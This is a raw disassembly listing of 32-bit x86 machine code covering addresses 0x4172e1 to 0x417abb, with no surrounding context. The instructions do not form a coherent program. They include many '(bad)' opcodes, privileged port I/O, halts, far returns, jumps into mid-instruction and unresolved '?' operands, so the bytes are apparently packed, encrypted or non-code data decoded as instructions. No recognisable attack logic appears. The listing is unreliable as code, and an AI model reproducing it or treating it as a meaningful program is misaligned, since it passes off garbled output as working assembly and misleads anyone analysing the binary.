  4172e1:	push   esi
  4172e2:	push   eax
  4172e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e4:	lea    esi,[edi+0x53b3a267]
  4172ea:	(bad)  
  4172eb:	sbb    eax,0x7a2c9dfe
  4172f0:	mov    dh,0x8
  4172f2:	mov    esi,0x56825477
  4172f7:	adc    edi,DWORD PTR [eax-0xb9d817c]
  4172fd:	fstp   st(0)
  4172ff:	xchg   ecx,eax
  417300:	push   ebp
  417301:	out    dx,al
  417302:	dec    ebx
  417303:	inc    esi
  417304:	scas   al,BYTE PTR es:[edi]
  417305:	xchg   ebp,eax
  417306:	add    cl,ah
  417308:	cmp    BYTE PTR [edx-0x79],dh
  41730b:	jae    0x417295
  41730d:	mov    esp,0xb05741f9
  417312:	pop    ebp
  417313:	addr16 repnz mov ds:0x559d,al
  417318:	adc    al,0x93
  41731a:	jno    0x4172fe
  41731c:	xor    edi,DWORD PTR [edi]
  41731e:	push   ebp
  41731f:	push   0x4f26d8d7
  417324:	bound  edi,QWORD PTR [eax]
  417326:	nop
  417327:	mov    DWORD PTR [eax+0x1d],esp
  41732a:	out    dx,al
  41732b:	enter  0xbe7,0xe8
  41732f:	into   
  417330:	xchg   edx,eax
  417331:	cmp    eax,0xb55fb581
  417336:	cli    
  417337:	stos   BYTE PTR es:[edi],al
  417338:	inc    ebp
  417339:	pop    esp
  41733a:	outs   dx,DWORD PTR ds:[esi]
  41733b:	aas    
  41733c:	sub    al,0x9a
  41733e:	out    0x1f,eax
  417340:	dec    ebx
  417341:	sbb    al,0xac
  417343:	add    al,0x3c
  417345:	push   0xffffffec
  417347:	mov    ebx,0x52005d8c
  41734c:	sub    DWORD PTR [ebx+0x4e8dd913],ebx
  417352:	jl     0x417326
  417354:	jno    0x417399
  417356:	jae    0x417339
  417358:	xor    ah,BYTE PTR [ebx-0x3fb7eb9e]
  41735e:	call   0x89bd5882
  417363:	jnp    0x417355
  417365:	addr16 cmp eax,0xa9727d73
  41736b:	jp     0x4173d1
  41736d:	and    DWORD PTR [ebx-0x7e],esi
  417370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417371:	cmp    al,0xb6
  417373:	push   edi
  417374:	mov    cl,0xd9
  417376:	retf   
  417377:	gs arpl dx,sp
  41737a:	cmp    DWORD PTR [ecx+0x70428567],0xffffffd7
  417381:	das    
  417382:	sub    eax,0xa4a870e5
  417387:	pop    es
  417388:	mov    ecx,0x255b7807
  41738d:	mov    ch,bh
  41738f:	inc    edi
  417390:	cmp    eax,edx
  417392:	pop    ebx
  417393:	xchg   esp,eax
  417394:	(bad)  
  417395:	lods   eax,DWORD PTR ds:[esi]
  417396:	or     DWORD PTR [edi*1+0x49acab26],edi
  41739d:	push   ds
  41739e:	mov    bl,0x88
  4173a0:	rcr    BYTE PTR [edx],0xb
  4173a3:	pop    esp
  4173a4:	mov    eax,0x3f197dfb
  4173a9:	adc    ebp,DWORD PTR [ebx-0xc]
  4173ac:	mov    dl,0xdf
  4173ae:	dec    esp
  4173af:	mov    DWORD PTR [edi],edi
  4173b1:	mov    edx,0x7c93ce21
  4173b6:	inc    edi
  4173b7:	jge    0x4173ff
  4173b9:	xor    DWORD PTR [ebx+0x61b8d93a],ecx
  4173bf:	test   DWORD PTR [ebp+0xa],0x755ad8f0
  4173c6:	(bad)  
  4173c7:	mov    eax,0xe08bfd77
  4173cc:	(bad)  
  4173cd:	clc    
  4173ce:	mov    cl,0x5b
  4173d0:	push   cs
  4173d1:	mov    bh,0xd9
  4173d3:	push   esp
  4173d4:	leave  
  4173d5:	fstp   st(2)
  4173d7:	sub    DWORD PTR [ecx],0x10759f6
  4173dd:	or     al,0x13
  4173df:	or     DWORD PTR [edx-0x1246b7cf],edx
  4173e5:	mov    ch,0x16
  4173e7:	test   eax,0xc0b44448
  4173ec:	or     eax,0xb232fa97
  4173f1:	push   es
  4173f2:	fucom  st(6)
  4173f4:	cld    
  4173f5:	out    dx,eax
  4173f6:	push   eax
  4173f7:	cmp    eax,0xc4a18e06
  4173fc:	je     0x41737e
  4173fe:	xchg   ebp,eax
  4173ff:	loope  0x41738b
  417401:	ins    BYTE PTR es:[edi],dx
  417402:	je     0x417480
  417404:	outs   dx,DWORD PTR ds:[esi]
  417405:	mov    BYTE PTR ds:0x8c2058db,al
  41740b:	jge    0x4173fa
  41740d:	inc    ebx
  41740e:	popa   
  41740f:	xor    al,BYTE PTR [edi]
  417411:	pop    esp
  417412:	test   al,0xcb
  417414:	sub    DWORD PTR [eax+0x318bc631],ebp
  41741a:	mov    ch,0x15
  41741c:	dec    ebp
  41741d:	or     bh,BYTE PTR [ecx+edx*8+0x5f6c65ff]
  417424:	adc    dh,BYTE PTR [edx]
  417426:	pop    es
  417427:	cmp    bh,BYTE PTR [eax-0x4f]
  41742a:	mov    cl,0x76
  41742c:	mov    esi,0x9fe2f07a
  417431:	das    
  417432:	add    cl,BYTE PTR [esi+eiz*1-0x70]
  417436:	imul   esp,DWORD PTR [ecx],0x621a491f
  41743c:	ret    
  41743d:	inc    ebx
  41743e:	js     0x4173d3
  417440:	add    eax,0x416b1f19
  417445:	or     DWORD PTR [edi+0x34],0x450a8257
  41744c:	es out dx,al
  41744e:	sub    al,0x81
  417450:	cmc    
  417451:	test   BYTE PTR [esi],dh
  417453:	fucomip st,st(5)
  417455:	out    dx,eax
  417456:	ins    DWORD PTR es:[edi],dx
  417457:	mov    esp,0xd8625030
  41745c:	test   ecx,0x695b6874
  417462:	fistp  WORD PTR [esi+ebp*8-0x53f567c9]
  417469:	and    al,0x30
  41746b:	cwde   
  41746c:	dec    edx
  41746d:	lods   al,BYTE PTR ds:[esi]
  41746e:	mov    al,0x5b
  417470:	les    ecx,FWORD PTR [ebx+eax*2+0x6d]
  417474:	push   esi
  417475:	lods   al,BYTE PTR ds:[esi]
  417476:	ds ret 
  417478:	scas   eax,DWORD PTR es:[edi]
  417479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41747a:	fadd   DWORD PTR [ecx]
  41747c:	in     eax,dx
  41747d:	(bad)  
  41747e:	mov    ds:0x611608ff,al
  417483:	fs xor eax,0x60e288f9
  417489:	mov    edx,0xf5b02d4
  41748e:	inc    edi
  41748f:	std    
  417490:	push   ebx
  417491:	xchg   BYTE PTR [edi-0x6b],dl
  417494:	pushf  
  417495:	mov    ah,0x3f
  417497:	mov    ah,0x85
  417499:	jae    0x4174ed
  41749b:	xchg   esi,eax
  41749c:	in     al,0x8
  41749e:	jl     0x417423
  4174a0:	inc    edi
  4174a1:	inc    edx
  4174a2:	test   al,0xda
  4174a4:	addr16 int 0x63
  4174a7:	push   ds
  4174a8:	je     0x4174dd
  4174aa:	imul   edx,DWORD PTR [edi+ebx*4+0x4d],0x32
  4174af:	bound  eax,QWORD PTR [esi]
  4174b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174b2:	and    al,0x14
  4174b4:	jne    0x4174d4
  4174b6:	fisubr WORD PTR [esi+eax*2-0x6b]
  4174ba:	fist   DWORD PTR [esi+0x3b476abd]
  4174c0:	es test esp,esi
  4174c3:	sbb    DWORD PTR [ebp+0x49],edx
  4174c6:	std    
  4174c7:	cmp    DWORD PTR [eax+eiz*2+0x7],ebx
  4174cb:	add    ebx,ecx
  4174cd:	cmc    
  4174ce:	or     al,0xb4
  4174d0:	pop    ds
  4174d1:	scas   al,BYTE PTR es:[edi]
  4174d2:	inc    ebp
  4174d3:	mov    bh,0x97
  4174d5:	retf   0x52af
  4174d8:	sub    BYTE PTR [ebx+0x75],al
  4174db:	std    
  4174dc:	in     al,dx
  4174dd:	and    BYTE PTR ss:[ebx-0x23],cl
  4174e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174e2:	inc    edx
  4174e3:	mov    cl,0x86
  4174e5:	scas   al,BYTE PTR es:[edi]
  4174e6:	xchg   BYTE PTR [esi-0x31a3c1be],ah
  4174ec:	lods   eax,DWORD PTR ds:[esi]
  4174ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4174ee:	push   ebx
  4174ef:	push   ebp
  4174f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174f1:	sbb    eax,0xb28a6914
  4174f6:	or     esp,ebx
  4174f8:	mov    ah,0x9d
  4174fa:	loop   0x4174f2
  4174fc:	pop    eax
  4174fd:	sbb    ch,BYTE PTR [edi]
  4174ff:	and    edi,eax
  417501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417502:	lahf   
  417503:	jo     0x417579
  417505:	(bad)  
  417506:	pop    esp
  417507:	sub    ecx,DWORD PTR [eax]
  417509:	(bad)  
  41750a:	sub    DWORD PTR [ebx+0xeec78f4],edi
  417510:	out    0xfe,al
  417512:	or     eax,0xe7a3470c
  417517:	cld    
  417518:	mov    esi,0xa1ef8078
  41751d:	cmp    ebp,ebp
  41751f:	push   ss
  417520:	into   
  417521:	pushf  
  417522:	pop    ebp
  417523:	fist   WORD PTR cs:[edi+eiz*4]
  417527:	mov    edx,0x70b6ab22
  41752c:	adc    ebx,esi
  41752e:	jmp    0xf0a8f489
  417533:	mov    edx,?
  417535:	adc    eax,0xa6775643
  41753a:	out    dx,eax
  41753b:	aam    0x24
  41753d:	add    eax,0x5f570c70
  417542:	test   DWORD PTR [ebx+ecx*2-0x63aa6242],eax
  417549:	aaa    
  41754a:	sub    DWORD PTR [edx-0x71],0xe4d163a
  417551:	cmp    DWORD PTR [eax-0x757cf3ae],edx
  417557:	lahf   
  417558:	jae    0x417565
  41755a:	fsubr  DWORD PTR [ecx]
  41755c:	cmc    
  41755d:	retf   0xb4e0
  417560:	not    DWORD PTR [edx]
  417562:	jle    0x4175d7
  417564:	ins    DWORD PTR es:[edi],dx
  417565:	(bad)  
  417566:	or     DWORD PTR [esi+0x7a60dd9d],ecx
  41756c:	jp     0x4175c1
  41756e:	sub    ch,dl
  417570:	xor    al,0x86
  417572:	push   ss
  417573:	cmp    ebp,eax
  417575:	add    BYTE PTR [eax-0x8a54ebb],ah
  41757b:	fwait
  41757c:	mov    ebx,0x96a3cbbe
  417581:	xor    al,0x3b
  417583:	ss or  eax,0xa2ad76ee
  417589:	add    eax,0x46cab4b7
  41758e:	in     eax,0xd3
  417590:	cmp    al,0xb7
  417592:	mov    ds:0xe67d083,al
  417597:	test   eax,0xc5a4838f
  41759c:	mov    esi,0x7350759b
  4175a1:	xchg   edx,edx
  4175a3:	xchg   edi,eax
  4175a4:	cwde   
  4175a5:	outs   dx,BYTE PTR ds:[esi]
  4175a6:	outs   dx,BYTE PTR ds:[esi]
  4175a7:	lods   eax,DWORD PTR ds:[esi]
  4175a8:	sub    ah,cl
  4175aa:	cmp    BYTE PTR [eax+0x31],0x91
  4175ae:	mov    eax,0xec03e1ac
  4175b3:	sbb    eax,0x42f8ece6
  4175b8:	or     DWORD PTR [esi-0x5a],ebp
  4175bb:	ins    DWORD PTR es:[edi],dx
  4175bc:	stos   BYTE PTR es:[edi],al
  4175bd:	cwde   
  4175be:	cs popf 
  4175c0:	xchg   ecx,eax
  4175c1:	stc    
  4175c2:	test   al,0x68
  4175c4:	ret    0x2874
  4175c7:	jo     0x41760a
  4175c9:	out    dx,eax
  4175ca:	dec    esp
  4175cb:	mov    ch,0x62
  4175cd:	mov    DWORD PTR [ebx-0x6c4eff59],esp
  4175d3:	mov    esp,0x28b043fd
  4175d8:	push   ss
  4175d9:	test   eax,0xd507c309
  4175de:	leave  
  4175df:	stos   DWORD PTR es:[edi],eax
  4175e0:	sti    
  4175e1:	xor    al,0xa8
  4175e3:	inc    ecx
  4175e4:	push   edi
  4175e5:	cmp    BYTE PTR [esi-0x5b332b5c],dh
  4175eb:	inc    esi
  4175ec:	cmc    
  4175ed:	push   edi
  4175ee:	jne    0x4175ff
  4175f0:	js     0x417636
  4175f2:	cmp    eax,0x50baa772
  4175f7:	sahf   
  4175f8:	mov    ebx,0x80e05573
  4175fd:	xchg   esp,eax
  4175fe:	pop    ds
  4175ff:	data16 ds aad 0x13
  417603:	in     eax,dx
  417604:	loopne 0x41767e
  417606:	repnz ficom WORD PTR ds:0x9abcb4e2
  41760d:	sbb    eax,0x1f4907fb
  417612:	pushf  
  417613:	xchg   ecx,eax
  417614:	rcr    BYTE PTR [edx-0x23fd268e],1
  41761a:	dec    esp
  41761b:	mov    esp,DWORD PTR [eax+edx*1-0x3d]
  41761f:	or     ah,BYTE PTR [ebx]
  417621:	rep outs dx,DWORD PTR ds:[esi]
  417623:	push   esi
  417624:	dec    ebp
  417625:	mov    esp,gs
  417627:	xchg   BYTE PTR [edx],dh
  417629:	mov    ds,WORD PTR [esi+0x79cc4196]
  41762f:	mov    ds:0xb1b4a5ca,eax
  417634:	ffree  st(1)
  417636:	push   ds
  417637:	pop    ebp
  417638:	and    BYTE PTR [ecx-0x1d],ch
  41763b:	mov    esp,0x5f5c2ce
  417640:	into   
  417641:	mov    eax,ds:0xae3438b7
  417646:	hlt    
  417647:	int3   
  417648:	outs   dx,BYTE PTR ds:[esi]
  417649:	or     DWORD PTR [eax+edx*4],0x13
  41764d:	push   ebp
  41764e:	dec    edi
  41764f:	test   DWORD PTR ds:0x61825108,eax
  417655:	addr16 ror esp,1
  417658:	add    DWORD PTR [esi+ecx*8],ebx
  41765b:	cmp    bh,BYTE PTR [edi]
  41765d:	outs   dx,DWORD PTR ds:[esi]
  41765e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41765f:	sbb    eax,0x295d51ae
  417664:	popf   
  417665:	ins    DWORD PTR es:[edi],dx
  417666:	mov    cl,0x44
  417668:	sub    ebp,DWORD PTR [edi-0x2f]
  41766b:	popf   
  41766c:	aas    
  41766d:	rep outs dx,BYTE PTR ds:[esi]
  41766f:	sbb    eax,0x2e53b1f6
  417674:	test   BYTE PTR [ebx+eax*8+0x685a7284],ch
  41767b:	nop
  41767c:	fidivr DWORD PTR [eax+0x3881c0e0]
  417682:	add    esp,ebx
  417684:	jnp    0x417700
  417686:	jg     0x4176ad
  417688:	lods   al,BYTE PTR ds:[esi]
  417689:	and    eax,edi
  41768b:	add    edi,DWORD PTR cs:[ebx]
  41768e:	in     eax,dx
  41768f:	pop    esi
  417690:	(bad)  
  417691:	repnz xor al,BYTE PTR [edx-0xf98a0fa]
  417698:	(bad)  
  417699:	in     eax,0x8b
  41769b:	jg     0x41764d
  41769d:	jle    0x4176db
  41769f:	mov    es,WORD PTR [ebx-0x1fd85dc7]
  4176a5:	dec    ebp
  4176a6:	push   0xedf9b564
  4176ab:	inc    ebp
  4176ac:	cld    
  4176ad:	repz inc ebp
  4176af:	test   eax,0x3f787cf6
  4176b4:	adc    DWORD PTR [edx+0x49],0x1d3506c4
  4176bb:	sub    DWORD PTR [ebx+0x2b],edi
  4176be:	xchg   edx,eax
  4176bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4176c0:	or     DWORD PTR [edx+0x18ba881],ebp
  4176c6:	mov    ch,0x9b
  4176c8:	push   esp
  4176c9:	or     eax,0x45295bef
  4176ce:	fwait
  4176cf:	cli    
  4176d0:	adc    ebp,DWORD PTR [eax+0x4a]
  4176d3:	das    
  4176d4:	xor    eax,0x6f4e984a
  4176d9:	mov    bl,BYTE PTR [ebp-0x6a]
  4176dc:	pop    edi
  4176dd:	int    0xcb
  4176df:	mov    al,ds:0xa487331b
  4176e4:	push   ecx
  4176e5:	jmp    0x4176fa
  4176e7:	ror    BYTE PTR [ecx],cl
  4176e9:	pop    eax
  4176ea:	fwait
  4176eb:	push   eax
  4176ec:	cmp    BYTE PTR [edx],dh
  4176ee:	sub    al,cl
  4176f0:	jne    0x4176cb
  4176f2:	sbb    eax,0xfb4d7682
  4176f7:	and    al,0xdd
  4176f9:	(bad)  
  4176fa:	jp     0x4176c2
  4176fc:	push   ebx
  4176fd:	(bad)  
  4176fe:	mov    edi,0x3f2ecc83
  417703:	aaa    
  417704:	inc    edx
  417705:	cdq    
  417706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417707:	sbb    BYTE PTR [ebx+0x245ab659],bh
  41770d:	jb     0x4176d0
  41770f:	jbe    0x417693
  417711:	hlt    
  417712:	adc    eax,DWORD PTR [ecx+0x7d]
  417715:	(bad)  
  417716:	sbb    esi,DWORD PTR [edi-0x3474aae1]
  41771c:	mov    eax,edx
  41771e:	imul   ebp,DWORD PTR [ebx+edi*1],0x34af6392
  417725:	iret   
  417726:	mov    al,ds:0xdc2102ac
  41772b:	push   cs
  41772c:	aam    0xb3
  41772e:	cmp    DWORD PTR [edi+eax*1+0xc6d8873],ebx
  417735:	xor    DWORD PTR [edx-0x756d85e7],edi
  41773b:	inc    ecx
  41773c:	or     bl,BYTE PTR [edx+0x75]
  41773f:	not    DWORD PTR [eax+edi*2]
  417742:	xchg   edi,eax
  417743:	in     al,dx
  417744:	inc    esp
  417745:	and    eax,0x36bbde18
  41774a:	(bad)  
  41774b:	jb     0x41777a
  41774d:	lea    ebx,[ecx]
  41774f:	cwde   
  417750:	pusha  
  417751:	or     ch,BYTE PTR [ecx-0x430c9e77]
  417757:	ror    DWORD PTR [ebp-0x7efd5612],cl
  41775d:	xchg   ebp,eax
  41775e:	test   DWORD PTR [edx-0x7b6b297],eax
  417764:	mov    WORD PTR [ecx+edx*4+0x6848939d],gs
  41776b:	sbb    al,0x28
  41776d:	shl    cl,1
  41776f:	leave  
  417770:	push   0x891b2204
  417775:	ret    0xc045
  417778:	jae    0x417759
  41777a:	inc    esp
  41777b:	dec    eax
  41777c:	jo     0x417748
  41777e:	push   eax
  41777f:	fwait
  417780:	arpl   WORD PTR [esi-0x66],si
  417783:	sbb    DWORD PTR [eax],ecx
  417785:	das    
  417786:	add    DWORD PTR [edi],eax
  417788:	cmc    
  417789:	iret   
  41778a:	pop    edx
  41778b:	popf   
  41778c:	(bad)  
  41778d:	sub    dl,ch
  41778f:	jge    0x4177dc
  417791:	imul   edx,ecx,0x39b6bac1
  417797:	add    DWORD PTR [edx-0x7],ebx
  41779a:	les    esi,FWORD PTR [ecx+0x193ddb2]
  4177a0:	or     ebp,esi
  4177a2:	inc    ecx
  4177a3:	enter  0xea68,0x9c
  4177a7:	test   eax,0x5e3efb05
  4177ac:	xor    DWORD PTR [edi-0x30],ecx
  4177af:	mov    BYTE PTR [ebx-0x42e2dda6],cl
  4177b5:	aaa    
  4177b6:	(bad)  
  4177b7:	stc    
  4177b8:	pop    edi
  4177b9:	mov    ah,0x2e
  4177bb:	jb     0x417779
  4177bd:	repz sub ah,dl
  4177c0:	imul   ecx,DWORD PTR [ebx-0x7b],0x5d
  4177c4:	xchg   ebx,eax
  4177c5:	mov    edi,0xecd37960
  4177ca:	in     eax,dx
  4177cb:	lea    edx,[edx-0x2935bad]
  4177d1:	stos   BYTE PTR es:[edi],al
  4177d2:	imul   esi,ecx,0xffffffd6
  4177d5:	cmp    ebx,ebp
  4177d7:	(bad)  
  4177d8:	loope  0x417790
  4177da:	rol    BYTE PTR [eax],0x7c
  4177dd:	inc    esp
  4177de:	jle    0x41782a
  4177e0:	dec    esi
  4177e1:	inc    ebx
  4177e2:	sbb    ch,BYTE PTR [eax]
  4177e4:	in     eax,dx
  4177e5:	loopne 0x41784c
  4177e7:	inc    eax
  4177e8:	push   edi
  4177e9:	inc    ecx
  4177ea:	aad    0x35
  4177ec:	xor    cl,bh
  4177ee:	arpl   WORD PTR [eax+0x4a],sp
  4177f1:	and    DWORD PTR cs:[edx-0x78f3520a],ebx
  4177f8:	push   eax
  4177f9:	and    al,0x58
  4177fb:	fcom   st(3)
  4177fd:	test   eax,0x659d223b
  417802:	xchg   esp,eax
  417803:	loop   0x417859
  417805:	js     0x4177b2
  417807:	outs   dx,BYTE PTR ds:[esi]
  417808:	inc    eax
  417809:	cld    
  41780a:	jecxz  0x4177ec
  41780c:	ss adc al,0x87
  41780f:	and    ah,BYTE PTR ds:0x1a5e21e9
  417815:	fsubr  DWORD PTR [ecx+eax*1+0x31]
  417819:	imul   DWORD PTR [esi]
  41781b:	mov    esp,0xbe2dadb8
  417820:	xor    eax,0xb280b401
  417825:	cdq    
  417826:	fist   WORD PTR [ebp-0x13]
  417829:	icebp  
  41782a:	dec    ebx
  41782b:	adc    ecx,ecx
  41782d:	pop    ebp
  41782e:	ret    
  41782f:	mov    bh,0xee
  417831:	outs   dx,BYTE PTR ds:[esi]
  417832:	lahf   
  417833:	pop    eax
  417834:	jmp    0x8e80322
  417839:	aaa    
  41783a:	aam    0xba
  41783c:	mov    ecx,edx
  41783e:	push   edx
  41783f:	xchg   esi,eax
  417840:	(bad)  
  417841:	hlt    
  417842:	test   al,0x28
  417844:	mov    ds:0xf2c58421,al
  417849:	dec    BYTE PTR [eax-0x45]
  41784c:	out    0x46,eax
  41784e:	(bad)  
  41784f:	out    dx,eax
  417850:	scas   al,BYTE PTR es:[edi]
  417851:	and    BYTE PTR [edx-0x6c],ch
  417854:	pop    eax
  417855:	mov    ebx,0xbc80c0f2
  41785a:	sbb    al,0x59
  41785c:	mov    eax,0xf936de2f
  417861:	popa   
  417862:	and    eax,0xbd39f744
  417867:	push   ds
  417868:	or     eax,0x9bb1cc7b
  41786d:	dec    ebx
  41786e:	ret    0x3906
  417871:	mov    ah,cl
  417873:	mov    ch,0xbc
  417875:	ja     0x417862
  417877:	arpl   si,bx
  417879:	les    ebp,FWORD PTR [eax+ebp*1-0x1a37fb20]
  417880:	int3   
  417881:	fwait
  417882:	jecxz  0x4178ce
  417884:	call   0x5aedd0db
  417889:	sub    esp,DWORD PTR [eax-0x16]
  41788c:	push   ecx
  41788d:	repz sbb cl,0xdb
  417891:	and    DWORD PTR ds:0x2ee495a5,0x8a51f435
  41789b:	jl     0x4178f5
  41789d:	int    0x47
  41789f:	or     DWORD PTR [eax-0x739dbec2],0x1889cb7d
  4178a9:	ja     0x4178f1
  4178ab:	jl     0x417836
  4178ad:	data16 add al,bl
  4178b0:	cmp    eax,DWORD PTR [esi+0x1fe9ec11]
  4178b6:	jno    0x41792c
  4178b8:	mov    eax,0x99e04039
  4178bd:	(bad)  
  4178be:	jecxz  0x41793d
  4178c0:	cmp    al,0xea
  4178c2:	dec    esp
  4178c3:	pop    ss
  4178c4:	and    al,0xaf
  4178c6:	cmp    BYTE PTR [edi],al
  4178c8:	jg     0x4178dc
  4178ca:	nop
  4178cb:	pushf  
  4178cc:	mov    dh,0xe7
  4178ce:	cmp    ch,BYTE PTR [ebx]
  4178d0:	fld    st(6)
  4178d2:	jge    0x41788b
  4178d4:	data16 cmp al,0xec
  4178d7:	test   al,0x8b
  4178d9:	or     bl,BYTE PTR [ebp+eiz*1-0x26]
  4178dd:	fsubr  QWORD PTR [esi]
  4178df:	pop    ebx
  4178e0:	ds loope 0x417865
  4178e3:	pop    esi
  4178e4:	pusha  
  4178e5:	mov    ebp,0x92eb448f
  4178ea:	es inc edx
  4178ec:	jecxz  0x417883
  4178ee:	es (bad) 
  4178f0:	pop    eax
  4178f1:	(bad)  
  4178f2:	dec    edi
  4178f3:	mov    al,ds:0x3deec224
  4178f8:	ret    0xb3d3
  4178fb:	pusha  
  4178fc:	lock es scas al,BYTE PTR es:[edi]
  4178ff:	dec    ecx
  417900:	div    BYTE PTR [ebx]
  417902:	jle    0x4178d2
  417904:	or     eax,0x83da1e40
  417909:	mov    esi,0x4f73ff6a
  41790e:	cs daa 
  417910:	and    eax,0x620735c6
  417915:	mov    bl,0xd5
  417917:	push   es
  417918:	sub    esi,esi
  41791a:	mov    DWORD PTR [ebx+0x55],eax
  41791d:	sub    eax,0x7a6b6866
  417922:	jne    0x417924
  417924:	fild   QWORD PTR [esi]
  417926:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417927:	jmp    0x4179a2
  417929:	jnp    0x4178e1
  41792b:	fnstsw WORD PTR [edi]
  41792d:	fst    QWORD PTR [ebx+0x70d71347]
  417933:	stos   DWORD PTR es:[edi],eax
  417934:	sbb    eax,0x41fbbba5
  417939:	jb     0x4179ab
  41793b:	idiv   BYTE PTR [eax+ecx*2]
  41793e:	inc    edi
  41793f:	add    DWORD PTR [ebx],ebp
  417941:	pop    DWORD PTR [edi-0x2c3510bd]
  417947:	cmp    DWORD PTR [edi],eax
  417949:	ja     0x417941
  41794b:	adc    eax,0x6c83f0a5
  417950:	mov    cl,0xde
  417952:	or     DWORD PTR [ecx-0x24],0x4db52bad
  417959:	xor    al,0x66
  41795b:	lods   eax,DWORD PTR ds:[esi]
  41795c:	add    dh,BYTE PTR ds:[ecx+0x48]
  417960:	xchg   esp,eax
  417961:	loope  0x41791f
  417963:	sub    BYTE PTR [ecx],dl
  417965:	xlat   BYTE PTR ds:[ebx]
  417966:	xchg   BYTE PTR [edi+0x58a7e409],ch
  41796c:	out    0x88,eax
  41796e:	das    
  41796f:	pop    edi
  417970:	mov    bh,0xcb
  417972:	and    DWORD PTR [esi-0x42],esi
  417975:	push   ecx
  417976:	sahf   
  417977:	popf   
  417978:	cmp    ebx,DWORD PTR [esi+eiz*4]
  41797b:	pop    ebx
  41797c:	jl     0x4179a8
  41797e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41797f:	inc    ebx
  417980:	adc    eax,0x83271193
  417985:	rcl    BYTE PTR [edi+0x37],cl
  417988:	add    BYTE PTR [eax+0x1e7e487c],ah
  41798e:	dec    esp
  41798f:	mov    al,BYTE PTR [esi+0x2a]
  417992:	sbb    eax,0x14d78ada
  417997:	mov    ds:0xc7323a9,eax
  41799c:	test   BYTE PTR [esi-0x1a],cl
  41799f:	cmp    DWORD PTR [ebp+0x64826a0d],edi
  4179a5:	test   DWORD PTR [eax],edx
  4179a7:	jl     0x4179c0
  4179a9:	aaa    
  4179aa:	fcomp  QWORD PTR [ebx+esi*1+0x5d]
  4179ae:	mov    ebx,0x117cd6
  4179b3:	lods   eax,DWORD PTR ds:[esi]
  4179b4:	inc    ebp
  4179b5:	sub    al,0xaa
  4179b7:	sbb    ecx,DWORD PTR fs:[esi+0x20696c86]
  4179be:	ret    
  4179bf:	lods   eax,DWORD PTR es:[esi]
  4179c1:	mov    esi,0xf5aa9c1
  4179c6:	jecxz  0x41799e
  4179c8:	arpl   WORD PTR cs:[esi+0x37],dx
  4179cc:	jl     0x4179d3
  4179ce:	cmp    BYTE PTR [ebx-0x7515408e],bh
  4179d4:	jge    0x417a4e
  4179d6:	callw  0xa925
  4179da:	loope  0x417a57
  4179dc:	scas   eax,DWORD PTR es:[edi]
  4179dd:	sbb    BYTE PTR [edi+0x49],0x4b
  4179e1:	and    al,0x83
  4179e3:	inc    ebx
  4179e4:	stos   DWORD PTR es:[edi],eax
  4179e5:	enter  0x1ba9,0x23
  4179e9:	mov    ebp,0xa7f8173f
  4179ee:	arpl   WORD PTR [esi-0x4f],cx
  4179f1:	enter  0x8921,0x12
  4179f5:	rcr    BYTE PTR ds:0xf8a8f8e9,cl
  4179fb:	pop    ss
  4179fc:	rcl    BYTE PTR [edi],0x39
  4179ff:	mov    eax,0x5fa8e96d
  417a04:	mov    ?,edi
  417a06:	or     eax,0x22f1d726
  417a0b:	xor    eax,0x27c34d56
  417a10:	add    bh,bl
  417a12:	stos   DWORD PTR es:[edi],eax
  417a13:	add    dh,BYTE PTR [ebp+0x2e]
  417a16:	sub    dh,al
  417a18:	fisub  DWORD PTR [edx]
  417a1a:	push   ds
  417a1b:	sbb    ah,bh
  417a1d:	xchg   bp,ax
  417a1f:	stc    
  417a20:	dec    edx
  417a21:	hlt    
  417a22:	inc    ebx
  417a23:	pop    edi
  417a24:	xchg   edi,eax
  417a25:	ja     0x4179f0
  417a27:	inc    edx
  417a28:	jge    0x417a28
  417a2a:	pop    esi
  417a2b:	sbb    DWORD PTR [edi+eax*2+0x9e75aa3],eax
  417a32:	push   ecx
  417a33:	(bad)  [ebp+0x14]
  417a36:	lds    esp,FWORD PTR [ecx+0x748f5d71]
  417a3c:	dec    ebx
  417a3d:	mov    ebp,0x5857043b
  417a42:	adc    eax,0x4b1acd0
  417a47:	outs   dx,DWORD PTR ds:[esi]
  417a48:	test   BYTE PTR [edx-0x58],0x6c
  417a4c:	ror    BYTE PTR [edx-0x7a],0xc8
  417a50:	jbe    0x417ace
  417a52:	(bad)  
  417a53:	test   edx,0x66fcae04
  417a59:	ins    DWORD PTR es:[edi],dx
  417a5a:	repnz push eax
  417a5c:	stc    
  417a5d:	push   ss
  417a5e:	adc    BYTE PTR [eax+0x15],ah
  417a61:	sbb    ah,BYTE PTR [ebx+0x663a6c1b]
  417a67:	pusha  
  417a68:	jecxz  0x417a36
  417a6a:	push   cs
  417a6b:	imul   eax,DWORD PTR [ebp-0x49],0x8a6c8d44
  417a72:	cmp    al,0xe2
  417a74:	cmp    BYTE PTR [ecx+0x185a1fd7],al
  417a7a:	sbb    al,0x9c
  417a7c:	sbb    al,0x77
  417a7e:	xor    DWORD PTR [edx+0x270be470],edi
  417a84:	mov    ds:0x6349e1ca,al
  417a89:	aam    0x5a
  417a8b:	lock (bad) 
  417a8d:	scas   al,BYTE PTR es:[edi]
  417a8e:	leave  
  417a8f:	push   ebp
  417a90:	shl    DWORD PTR [ebp+0x5d4332d7],0xbc
  417a97:	mov    edx,0x889538ee
  417a9c:	xor    cl,bh
  417a9e:	push   0xc1e6b29a
  417aa3:	fisttp DWORD PTR [ebx+ebp*1+0x7c]
  417aa7:	or     DWORD PTR [ecx+0x57],eax
  417aaa:	and    al,0x13
  417aac:	mov    ds:0x5acd56d1,al
  417ab1:	repz push cs
  417ab3:	mov    eax,0xf4a0a67a
  417ab8:	fisubr DWORD PTR [ebp-0xe]
  417abb:	repnz mov DWORD PTR [eax+0x367f56ab],edi
